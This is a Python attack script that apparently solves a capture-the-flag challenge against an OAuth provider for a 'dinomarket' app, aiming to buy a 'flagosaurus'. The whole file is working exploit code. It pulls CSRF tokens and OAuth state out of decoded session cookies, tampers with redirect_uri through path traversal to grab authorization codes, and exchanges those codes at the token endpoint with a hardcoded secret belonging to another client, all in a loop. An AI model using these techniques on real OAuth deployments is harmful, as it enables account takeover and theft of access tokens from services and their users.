import requests
from urllib.parse import urlparse, parse_qs
import json
from bs4 import BeautifulSoup
import base64

IDP_URI = "http://172.31.91.29:3002"
BASE_URI = "http://172.31.91.29:3001"
MY_SERVER = "http://localhost:3002/oauth/token"
sess = requests.Session()

FINAL_CALLBACK_URI = IDP_URI + "/receiveGrant"
CALLBACK_URI = (
    IDP_URI
    + "/oauth/authorize?response_type=code&client_id=dinomarket_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%2Cbuy_dinosaurus%2Cbuy_flagosaurus&redirect_uri=http%3A%2F%2F172.31.91.29%3A3001%2FreceiveGrant&state=os-100"
)

# CALLBACK_URI = MY_SERVER + "/buy_flagosaurus"


def get_csrf_token(html):
    soup = BeautifulSoup(html, "html.parser")

    # Find the input element with id 'csrf-token-input' inside the form with id 'confirm-form'
    csrf_token_input = soup.select_one("#confirm-form #csrf-token-input")

    if csrf_token_input:
        csrf_token_value = csrf_token_input["value"]
        return csrf_token_value
    else:
        exit(1)


def register(username, password):
    
    resp = requests.post(
        IDP_URI + "/oauth/register",
        data={
            "username": username,
            "password": password,
            "callback_uri": base64.b64encode(CALLBACK_URI.encode()).decode("utf-8"),
        },
        allow_redirects=True,
    )
    print(resp.text)


def login(username, password):
    print(base64.b64encode(CALLBACK_URI.encode()).decode("utf-8"))
    resp = sess.post(
        IDP_URI + "/oauth/login",
        data={
            "username": username,
            "password": password,
            "callback_uri": base64.b64encode(CALLBACK_URI.encode()).decode("utf-8"),
        },
        allow_redirects=True,
    )
    print(resp.text)

    # print(
    #     "[+] Logged in",
    #     resp.status_code,
    #     resp.is_redirect,
    #     resp.text,
    #     dict(resp.cookies),
    #     # base64.b64decode(resp.cookies["koa:sess"]),
    # )
    return resp.text


def get_params(url):
    parsed_url = urlparse(url)

    # Extract query parameters
    query_params = parse_qs(parsed_url.query)

    # Get the values of 'code' and 'state' parameters
    code = query_params.get("code", [None])[0]
    state = query_params.get("state", [None])[0]

    print("Code:", code)
    print("State:", state)
    return code, state


def process_oauth(csrf_token_value, state="os-100"):
    # print(dict(sess.cookies))
    resp = sess.get(
        IDP_URI + "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": "dinomarket_app",
            "redirect_uri": BASE_URI + "/receiveGrant/../../",
            "scope": "user_info:read,list_dinos,buy_dino,sell_dino,buy_flagosaurus",
            "state": state,
            "agree": "true",
            "csrfToken": csrf_token_value,
        },
        allow_redirects=True,
    )

    # print(
    #     "[+] Finishing OAUTH in",
    #     resp.status_code,
    #     resp.is_redirect,
    #     # resp.text,
    #     dict(resp.cookies),
    #     # base64.b64decode(resp.cookies["koa:sess"]),
    # )
    return resp.text


def finish_oauth(csrf_token_value, state="os-100", redirect=False):
    # print(dict(sess.cookies))
    resp = sess.get(
        IDP_URI + "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": "dinomarket_app",
            "redirect_uri": BASE_URI + "/../receiveGrant",
            "scope": "user_info:read,list_dinos,buy_dino,sell_dino,buy_flagosaurus",
            "state": state,
            "agree": "true",
            "csrfToken": csrf_token_value,
        },
        allow_redirects=redirect,
    )

    # print(
    #     "[+] Finishing OAUTH in",
    #     resp.status_code,
    #     resp.is_redirect,
    #     # resp.text,
    #     dict(resp.cookies),
    #     # base64.b64decode(resp.cookies["koa:sess"]),
    # )

    return resp.headers["Location"]


def test_flag():
    resp = sess.get(BASE_URI + "/buy_flagosaurus")
    # print(resp.text)


def get_token(code, state=""):
    print(state)
    data = {
        "grant_type": "authorization_code",
        "client_id": "dinomaster_app",
        "client_secret": "this_is_the_dinomaster_client_secret",
        "code": code,
        "scope": "user_info:read,list_dinos,buy_dino,sell_dino",
        "redirect_uri": BASE_URI + "/receiveGrant",
        "callback_uri": BASE_URI + "/receiveGrant",
        "state": state,
        "referer": "http://localhost:3002/oauth/authorize?response_type=code&client_id=dinomarket_app&scope=user_info:read,list_dinos,buy_dino,sell_dino&redirect_uri=http://172.31.91.29:3001/receiveGrant&state="
        + state,
    }

    response = sess.post(IDP_URI + "/oauth/token", data=data, params={"state": "state"})

    print("[+] Getting token", response.status_code, dict(sess.cookies), response.text)
    print(response.text)


def submitCode(code, state):
    resp = sess.get(BASE_URI + "/receiveGrant", params={"code": code, "state": state})
    print(resp.status_code, resp.text)
    return resp


while True:
    print("trying")
    # register("adminos", "adminos")
    html = login("adminos", "adminos")
    csrf_token = json.loads(
        base64.b64decode(sess.cookies["koa:sess"].encode()).decode("utf-8")
    )
    csrf_token_value = get_csrf_token(html)
    html = process_oauth(csrf_token_value)
    csrf_token_value = get_csrf_token(html)
    state = json.loads(
        base64.b64decode(sess.cookies["koa:sess"].encode()).decode("utf-8")
    )["oauthState"]["state"]
    # finish_oauth(csrf_token_value, state, True)
    code, state = get_params(finish_oauth(csrf_token_value, state, False))
    get_token(code, state)
    # submitCode(code, state)
#
# test_flag()
